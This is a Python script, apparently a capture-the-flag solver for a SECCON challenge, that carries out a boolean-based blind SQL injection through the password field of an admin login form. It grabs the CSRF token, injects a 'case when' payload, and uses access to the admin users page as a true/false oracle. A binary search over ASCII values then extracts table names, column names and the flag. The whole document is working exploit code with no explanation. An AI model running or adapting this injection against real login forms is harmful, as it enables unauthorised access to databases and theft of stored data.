import requests
import re
import string

def check(s):
    sess = requests.Session()
    r = sess.get("http://staging.shooter.pwn.seccon.jp/admin/sessions/new")
    auth_token = re.findall(r'name="authenticity_token" value="(.+?)"', r.text)[0]
    data = {
        "login_id": "admin",
        "authenticity_token": auth_token,
        "password": "')))||(select case when ({}) then 1 else 0 end)#".format(s)
    }
    r = sess.post("http://staging.shooter.pwn.seccon.jp/admin/sessions", data=data)
    if not r.ok:
        return False
    r = sess.get("http://staging.shooter.pwn.seccon.jp/admin/users", allow_redirects=False)
    return r.status_code == 200

def dump_tables():
    tables = ""
    while 1:
        lo = 0
        hi = 255
        while lo <= hi:
            mid = (lo+hi)//2
            s = "select ascii(substr((select group_concat(table_name) from information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'),{},1)) > {}"
            s = s.format(len(tables)+1,mid)
            if check(s):
                lo = mid+1
            else:
                hi = mid-1
        if lo == 0:
            return tables
        tables += chr(lo)
        print(tables)

def dump_columns(table_name):
    columns = ""
    while 1:
        lo = 0
        hi = 255
        while lo <= hi:
            mid = (lo+hi)//2
            s = "select ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = '{}'),{},1)) > {}"
            s = s.format(table_name, len(columns)+1, mid)
            if check(s):
                lo = mid+1
            else:
                hi = mid-1
        if lo == 0:
            return columns
        columns += chr(lo)
        print(columns)

def dump_flag():
    flag = ""
    while 1:
        lo = 0
        hi = 255
        while lo <= hi:
            mid = (lo+hi)//2
            s = "select ascii(substr((select group_concat(value) from flags),{},1)) > {}"
            s = s.format(len(flag)+1, mid)
            if check(s):
                lo = mid+1
            else:
                hi = mid-1
        if lo == 0:
            return flag
        flag += chr(lo)
        print(flag)

dump_tables()
print()

dump_columns("flags")
print()

dump_flag()
print()
